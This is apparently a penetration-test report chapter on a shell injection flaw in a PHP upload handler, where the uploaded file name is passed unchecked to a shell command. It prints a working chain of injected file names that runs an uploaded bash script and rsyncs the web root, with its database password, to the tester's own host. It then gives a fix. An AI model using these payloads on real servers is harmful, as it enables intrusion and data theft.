\chapter{Shell Injection}

\section{Observation}

During the vulnerability testing of the batch transaction we discovered a shell injection. When uploading a file, it seems that the original file name the user chose is directly appended to the executable name of the C program and then given to the shell. Due to this we can use the file name to execute other programs, we even managed it to let the file be executed by bash.\newline


Likelihood:  medium - high\newline

Impact: high\newline

Risk: high\newline

\section{Discovery}

The discovery was easily found by simply uploading a file called \textit{\&\& sleep 30}. We then noticed that the response of the server is delayed by about 30 seconds. This was reason enough to try some more. We then tried to execute code which will download the \textit{/var/www} directory to our local box. The main problem was that it is not possible to use slashes in Unix file names. That means we can not easily change directories or name the file something like this:

\begin{lstlisting}[caption=File with '/' (does not work), label=listing:not_working_file]
&& rsync /var/www mybox::myshare
\end{lstlisting}

Due to this we wanted to be the uploaded file be interpreted by bash on the host, so we could just write a simple bash script with the following content:

\begin{lstlisting}[caption=Bash Script to Get PHP Code, label=listing:bash_script]
rsync /var/www mybox::myshare
\end{lstlisting}

The problem is, we need to somehow integrate the bash execution in our file name like this:

\begin{lstlisting}[caption=Executing code via bash, label=listing:execute_bash_script]
... && bash script.sh
\end{lstlisting}

That means that we need somehow get to the directory the uploaded file is located, we assumed \textit{/tmp/\$filename}.

So we need to change the directory to \textit{/tmp/}. We archived that to create a temporary directory, change to it, and then change to the upper directory like illustrated in Listing \ref{listing:change_to_tmp}. We had to do that because we cannot use slashes in the file name.

\begin{lstlisting}[caption=Change to \textit{/tmp/}, label=listing:change_to_tmp]
&& dir=`mktemp` && cd dir && cd .. 
\end{lstlisting}

Now we are in the directory were our shell script was uploaded. Now we have to execute it. Unfortunately this is pretty hard, because we cannot simply reference the script via the file name, because the file name is also the command we want to inject and we would then get into some recursive loop specifying the hole file name. The solution is to rename the file to some easier name like\textit{script.sh} and then execute it, illustrated in Listing \ref{listing:rename_file}.

\begin{lstlisting}[caption=Rename the file, label=listing:rename_file]
 ... && mv *.sh script.sh && bash script.sh
\end{lstlisting}
 
 We are moving the file \textit{*.sh} to script.sh (Our uploaded file ends with \textit{.sh}).
 
 Listing \ref{listing:complete_file_name} shows the complete file name\footnote{The \textit{rm -rf script.sh} is used to delete any script which was uploaded by a former attack, otherwise renaming the file would fail because \textit{script.sh} would already exist.} which we have used to execute our code.
 
\begin{lstlisting}[caption=Complete File Name, label=listing:complete_file_name]
&& dir=`mktemp` && cd dir && cd .. && rm -rf script.sh && mv *.sh script.sh && bash script.sh
\end{lstlisting}

The command sent to the shell by the PHP code would look similar to this:

\begin{lstlisting}[caption=Shell Command executed by PHP, label=listing:shell_comannd]
./cparser && dir=`mktemp` && cd dir && cd .. && rm -rf script.sh && mv *.sh script.sh && bash script.sh
\end{lstlisting}

\section{Likelihood}
It took us hours to get this exploit working, but with some basic knowledge of the Unix Shell and Linux this exploit was possible with moderate effort.

\section{Implication}
A successful attack makes the server executing any code or program you like. We managed to get the hole PHP source code, where e.g. the database password is stored. It would be also possible to get other files like \textit{/etc/passwd} or execute other malicious code!

\section{Recommendations}
The easiest way to fix this issue is to use temporary randomly assigned file names and get rid of the one the user chose (Do not trust the user's unput!). Normally this is done automatically by PHP, moving the file to the originally chosen file name by the user is optional but part of most tutorials on the Internet.

